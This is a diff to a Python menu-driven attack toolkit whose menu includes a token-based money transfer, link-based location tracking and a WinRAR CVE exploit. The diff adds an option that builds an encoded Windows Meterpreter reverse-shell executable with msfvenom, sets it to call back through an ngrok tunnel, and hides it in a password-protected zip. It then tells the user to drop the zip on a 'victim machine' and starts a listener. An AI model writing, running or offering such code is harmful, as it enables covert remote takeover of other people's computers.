@@ -40,6 +40,8 @@ print('[10] QIWI Transfer money using token')
 print("[11] Check Location and information from link (seeker)(Blocked in Russia)")
 print("[12] Check Location and info from link (locator)(Working in Russia)")
 print("[13] Evil Winrar CVE")
+print("[14] Make Password Zipped file")
+print("[15] Make Password Zipped file with Meterpreter Backdoor")
 print('')
 query = input("[*] Choose exploit!:")
 if query in ["1"]:
@@ -170,6 +172,35 @@ if query in ["13"]:
 
 	CVE = ("cd && cd X-TOOL && ./evilWinRAR.py -e ") + (Evil_file) + (" -g ") + (Good_files)
 	os.system(CVE)
+if query in ["14"]:
+	print("Drop Required Files to Zip in home folder!")
+	File = input("Enter File Name What You want in Password Zip(/home folder)!:")
+	ZipFile = input("Enter File Name of Zip what you want(Dont forget .zip)!:")
+	ZipPassword = input("Enter What Password for Zip you want!:")
+	PassedZip = ("cd && zip --password ") + (ZipPassword) + (" ") + (ZipFile) + (" ") + (File)
+	os.system(PassedZip)
+	print("You Got Zip file in home folder!")
+if query in ["15"]:
+	print('')
+	print('Open another terminal and start Ngrok with tcp port 4444 (ngrok tcp 4444)')
+	NgrokPort = input('Write Ngrok Port!:')
+	PayloadFile = input('What name of file you want? (Dont forget to write .exe):')
+	
+
+	msfvenom = ('cd && msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=') + (NgrokPort) + (' -b "\\x00" -e x86/shikata_ga_nai -f exe -o') + (PayloadFile)
+	os.system(msfvenom)
+	postgresql = ('service postgresql start')
+	os.system(postgresql)
+
+
+	ZipFile = input("Enter File Name of Zip what you want(Dont forget .zip)!:")
+
+	ZipPassword = input("Enter What Password for Zip you want!:")
+	PassedZip = ("cd && zip --password ") + (ZipPassword) + (" ") + (ZipFile) + (" ") + (PayloadFile)
+	os.system(PassedZip)
+	print("Drop Zip to Victim Machine and say Password for Zip!")
+	msfMeter = ('msfconsole  -q -x "set payload windows/meterpreter/reverse_tcp; set lhost 0.0.0.0; set LPORT 4444; use multi/handler; exploit"')
+	os.system(msfMeter)
 else:
 	print('')
 	print('[X] Sorry, You didnt choose options!')
